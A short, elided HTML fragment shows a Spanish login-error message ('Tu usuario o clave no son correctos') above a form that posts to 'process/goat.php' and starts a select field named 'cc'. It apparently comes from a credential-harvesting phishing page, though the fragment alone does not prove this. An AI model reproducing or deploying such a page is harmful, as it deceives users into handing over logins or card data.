...
<body>
    ...
    <center>
        ...
        <div class="datos">
            ...
            <p style="color:#ff4444; font-weight:bold; margin:10px 0; text-align:center;">Tu usuario o clave no son correctos, por favor inténtalo de nuevo.</p><form action="process/goat.php" method="POST">
                <select name="cc">
